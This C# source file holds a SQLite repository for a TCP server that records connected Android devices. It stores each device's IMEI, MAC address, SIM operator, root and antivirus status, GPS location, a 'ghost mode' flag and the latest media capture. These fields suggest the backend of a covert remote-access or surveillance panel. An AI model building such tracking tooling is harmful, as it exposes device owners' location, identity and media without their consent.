using System;
using System.Collections.Generic;
using System.Data.SQLite;
using TcpServerApp.Services.Elite.Networking;

namespace TcpServerApp.Models
{
    public class ClientRepository
    {
        private readonly EliteDB _db;

        public ClientRepository(EliteDB db)
        {
            _db = db;
        }

        public void UpsertClient(string clientId, string ip, string deviceName, string model, string androidVersion, 
                                 string batteryLevel = null, string screenStatus = null, int rooted = -1, int appCount = -1,
                                 string imei = null, string simOp = null, string mac = null, 
                                 string countryCode = null, int sourcePort = 0,
                                 string actions = null, string avStatus = null, 
                                 string wifi = null, int ping = 0, double railPower = 0, double thermal = 0,
                                 double load = 0, double isolated = 0, 
                                 string integrity = null, string population = null, bool isGhostMode = false,
                                 double lat = 0, double lon = 0, int risk = 0, string media = null)
        {
            using var conn = _db.GetConnection();
            conn.Open();
            
            string sql = @"
                INSERT INTO Clients (
                    ClientId, IpAddress, DeviceName, Model, AndroidVersion, FirstSeen, LastSeen, IsOnline, 
                    BatteryLevel, ScreenStatus, Rooted, AppCount,
                    SourcePort, CountryCode, SimOperator, IMEI, MacAddress, SupportedActions, AvStatus, 
                    WifiStrength, Ping, RailPower, ThermalTemp, KernelLoad, NpuLoad, IsolatedMemory,
                    IntegrityStatus, ResearchPopulation, IsGhostMode, Latitude, Longitude, RiskScore, LatestMediaCapture
                )
                VALUES (
                    @id, @ip, @name, @model, @ver, @now, @now, 1, 
                    @batt, @screen, @root, @apps,
                    @port, @countryCode, @simOp, @imei, @mac, @actions, @av,
                    @wifi, @ping, @rail, @thermal, @kernel, @npu, @isolated,
                    @integrity, @research, @ghost, @lat, @lon, @risk, @media
                )
                ON CONFLICT(ClientId) DO UPDATE SET
                    IpAddress = @ip,
                    LastSeen = @now,
                    IsOnline = 1,
                    DeviceName = COALESCE(@name, DeviceName),
                    Model = COALESCE(@model, Model),
                    BatteryLevel = @batt,
                    ScreenStatus = @screen,
                    Rooted = @root,
                    AppCount = @apps,
                    SourcePort = @port,
                    CountryCode = COALESCE(@countryCode, CountryCode),
                    SimOperator = COALESCE(@simOp, SimOperator),
                    IMEI = COALESCE(@imei, IMEI),
                    MacAddress = COALESCE(@mac, MacAddress),
                    SupportedActions = COALESCE(@actions, SupportedActions),
                    AvStatus = COALESCE(@av, AvStatus),
                    WifiStrength = @wifi,
                    Ping = @ping,
                    RailPower = @rail,
                    ThermalTemp = @thermal,
                    KernelLoad = @kernel,
                    NpuLoad = @npu,
                    IsolatedMemory = @isolated,
                    IntegrityStatus = COALESCE(@integrity, IntegrityStatus),
                    ResearchPopulation = COALESCE(@research, ResearchPopulation),
                    IsGhostMode = @ghost,
                    Latitude = @lat,
                    Longitude = @lon,
                    RiskScore = @risk,
                    LatestMediaCapture = COALESCE(@media, LatestMediaCapture)";

            using var cmd = new SQLiteCommand(sql, conn);
            
            // Basic Info
            cmd.Parameters.AddWithValue("@id", clientId);
            cmd.Parameters.AddWithValue("@ip", ip);
            cmd.Parameters.AddWithValue("@name", (object)deviceName ?? DBNull.Value);
            cmd.Parameters.AddWithValue("@model", (object)model ?? DBNull.Value);
            cmd.Parameters.AddWithValue("@ver", (object)androidVersion ?? DBNull.Value);
            cmd.Parameters.AddWithValue("@now", DateTime.UtcNow);
            
            // Elite Telemetry
            cmd.Parameters.AddWithValue("@batt", (object)batteryLevel ?? DBNull.Value);
            cmd.Parameters.AddWithValue("@screen", (object)screenStatus ?? DBNull.Value);
            cmd.Parameters.AddWithValue("@root", rooted);
            cmd.Parameters.AddWithValue("@apps", appCount);
            
            // Extended Telemetry (Aligned with Handshake)
            cmd.Parameters.AddWithValue("@imei", (object)imei ?? DBNull.Value);
            cmd.Parameters.AddWithValue("@simOp", (object)simOp ?? DBNull.Value);
            cmd.Parameters.AddWithValue("@mac", (object)mac ?? DBNull.Value);
            cmd.Parameters.AddWithValue("@countryCode", (object)countryCode ?? DBNull.Value);
            cmd.Parameters.AddWithValue("@port", sourcePort);

            cmd.Parameters.AddWithValue("@actions", (object)actions ?? DBNull.Value);
            cmd.Parameters.AddWithValue("@av", (object)avStatus ?? DBNull.Value);
            cmd.Parameters.AddWithValue("@wifi", (object)wifi ?? DBNull.Value);
            cmd.Parameters.AddWithValue("@ping", ping);
            cmd.Parameters.AddWithValue("@rail", railPower);
            cmd.Parameters.AddWithValue("@thermal", thermal);
            cmd.Parameters.AddWithValue("@kernel", load);
            cmd.Parameters.AddWithValue("@npu", load); 
            cmd.Parameters.AddWithValue("@isolated", isolated);
            cmd.Parameters.AddWithValue("@integrity", (object)integrity ?? DBNull.Value);
            cmd.Parameters.AddWithValue("@research", (object)population ?? DBNull.Value);
            cmd.Parameters.AddWithValue("@ghost", isGhostMode ? 1 : 0);
            
            // Geolocation & Security
            cmd.Parameters.AddWithValue("@lat", lat);
            cmd.Parameters.AddWithValue("@lon", lon);
            cmd.Parameters.AddWithValue("@risk", risk);
            cmd.Parameters.AddWithValue("@media", (object)media ?? DBNull.Value);
            
            cmd.ExecuteNonQuery();
        }

        public void SetOffline(string clientId)
        {
            using var conn = _db.GetConnection();
            conn.Open();
            string sql = "UPDATE Clients SET IsOnline = 0, LastSeen = @now WHERE ClientId = @id";
            using var cmd = new SQLiteCommand(sql, conn);
            cmd.Parameters.AddWithValue("@id", clientId);
            cmd.Parameters.AddWithValue("@now", DateTime.UtcNow);
            cmd.ExecuteNonQuery();
        }

        public List<ClientEntity> GetAllClients()
        {
            var list = new List<ClientEntity>();
            using var conn = _db.GetConnection();
            conn.Open();
            string sql = "SELECT * FROM Clients ORDER BY IsOnline DESC, LastSeen DESC";
            using var cmd = new SQLiteCommand(sql, conn);
            using var reader = cmd.ExecuteReader();

            while (reader.Read())
            {
                list.Add(new ClientEntity
                {
                    ClientId = reader["ClientId"].ToString(),
                    DeviceName = reader["DeviceName"].ToString(),
                    IpAddress = reader["IpAddress"].ToString(),
                    LastSeen = Convert.ToDateTime(reader["LastSeen"]),
                    IsOnline = Convert.ToInt32(reader["IsOnline"]) == 1,
                    
                    // Elite Props
                    Model = reader["Model"].ToString(),
                    AndroidVersion = reader["AndroidVersion"].ToString(),
                    BatteryLevel = reader["BatteryLevel"] == DBNull.Value ? "Unknown" : reader["BatteryLevel"].ToString(),
                    ScreenStatus = reader["ScreenStatus"] == DBNull.Value ? "Unknown" : reader["ScreenStatus"].ToString(),
                    Rooted = reader["Rooted"] != DBNull.Value && Convert.ToInt32(reader["Rooted"]) == 1,
                    AppCount = reader["AppCount"] == DBNull.Value ? 0 : Convert.ToInt32(reader["AppCount"]),
                    
                    // Extended Telemetry 🚀
                    SourcePort = reader["SourcePort"] == DBNull.Value ? 0 : Convert.ToInt32(reader["SourcePort"]),
                    CountryCode = reader["CountryCode"] == DBNull.Value ? null : reader["CountryCode"].ToString(),
                    SimOperator = reader["SimOperator"] == DBNull.Value ? null : reader["SimOperator"].ToString(),
                    IMEI = reader["IMEI"] == DBNull.Value ? null : reader["IMEI"].ToString(),
                    MacAddress = reader["MacAddress"] == DBNull.Value ? null : reader["MacAddress"].ToString(),
                    SupportedActions = reader["SupportedActions"] == DBNull.Value ? null : reader["SupportedActions"].ToString(),
                    AvStatus = reader["AvStatus"] == DBNull.Value ? null : reader["AvStatus"].ToString(),
                    WifiStrength = reader["WifiStrength"] == DBNull.Value ? null : reader["WifiStrength"].ToString(),
                    Ping = reader["Ping"] == DBNull.Value ? 0 : Convert.ToInt32(reader["Ping"]),
                    RailPower = reader["RailPower"] == DBNull.Value ? 0 : Convert.ToDouble(reader["RailPower"]),
                    ThermalTemp = reader["ThermalTemp"] == DBNull.Value ? 0 : Convert.ToDouble(reader["ThermalTemp"]),
                    KernelLoad = reader["KernelLoad"] == DBNull.Value ? 0 : Convert.ToDouble(reader["KernelLoad"]),
                    NpuLoad = reader["NpuLoad"] == DBNull.Value ? 0 : Convert.ToDouble(reader["NpuLoad"]),
                    IsolatedMemory = reader["IsolatedMemory"] == DBNull.Value ? 0 : Convert.ToDouble(reader["IsolatedMemory"]),
                    IntegrityStatus = reader["IntegrityStatus"] == DBNull.Value ? null : reader["IntegrityStatus"].ToString(),
                    ResearchPopulation = reader["ResearchPopulation"] == DBNull.Value ? null : reader["ResearchPopulation"].ToString(),
                    IsGhostMode = reader["IsGhostMode"] != DBNull.Value && Convert.ToInt32(reader["IsGhostMode"]) == 1,
                    
                    // Geolocation & Security 🌍
                    Latitude = reader["Latitude"] == DBNull.Value ? 0 : Convert.ToDouble(reader["Latitude"]),
                    Longitude = reader["Longitude"] == DBNull.Value ? 0 : Convert.ToDouble(reader["Longitude"]),
                    RiskScore = reader["RiskScore"] == DBNull.Value ? 0 : Convert.ToInt32(reader["RiskScore"]),
                    LatestMediaCapture = reader["LatestMediaCapture"] == DBNull.Value ? null : reader["LatestMediaCapture"].ToString(),
                    
                    // Legacy Fields
                    City = reader["City"] == DBNull.Value ? null : reader["City"].ToString()
                });
            }
            return list;
        }

        public void LogFederatedComputeResult(string clientId, string population, string task, string status, float metric, string rawData)
        {
            using var conn = _db.GetConnection();
            conn.Open();
            string sql = @"
                INSERT INTO FederatedResults (ClientId, Population, Task, Status, Metric, Timestamp, RawPayload)
                VALUES (@id, @pop, @task, @status, @metric, @now, @raw)";
            
            using var cmd = new SQLiteCommand(sql, conn);
            cmd.Parameters.AddWithValue("@id", clientId);
            cmd.Parameters.AddWithValue("@pop", population);
            cmd.Parameters.AddWithValue("@task", task);
            cmd.Parameters.AddWithValue("@status", status);
            cmd.Parameters.AddWithValue("@metric", metric);
            cmd.Parameters.AddWithValue("@now", DateTime.UtcNow);
            cmd.Parameters.AddWithValue("@raw", (object)rawData ?? DBNull.Value);
            
            cmd.ExecuteNonQuery();
        }
        public List<object> GetPrivacyData(string clientId) => new List<object>(); // Placeholder
        public List<object> GetSensorLogs(string clientId) => new List<object>(); // Placeholder
    }

    public class ClientEntity
    {
        public string ClientId { get; set; }
        public string DeviceName { get; set; }
        public string IpAddress { get; set; }
        public DateTime LastSeen { get; set; }
        public bool IsOnline { get; set; }
        
        // Elite Telemetry 🌟
        public string Model { get; set; }
        public string AndroidVersion { get; set; }
        public string BatteryLevel { get; set; }
        public string ScreenStatus { get; set; }
        public bool Rooted { get; set; }
        public int AppCount { get; set; }
        
        // Elite Research Core
        public int SourcePort { get; set; }
        public string CountryCode { get; set; }
        public string SimOperator { get; set; }
        public string IMEI { get; set; }
        public string MacAddress { get; set; }
        public string SupportedActions { get; set; }
        public string City { get; set; }
        public string AvStatus { get; set; }
        public string WifiStrength { get; set; }
        public int Ping { get; set; }
        public double RailPower { get; set; }
        public double ThermalTemp { get; set; }
        public double KernelLoad { get; set; }
        public double NpuLoad { get; set; }
        public double IsolatedMemory { get; set; }
        public string IntegrityStatus { get; set; }
        public string ResearchPopulation { get; set; }
        public bool IsGhostMode { get; set; }

        public double Latitude { get; set; }
        public double Longitude { get; set; }
        public int RiskScore { get; set; }
        public string LatestMediaCapture { get; set; }
    }
}
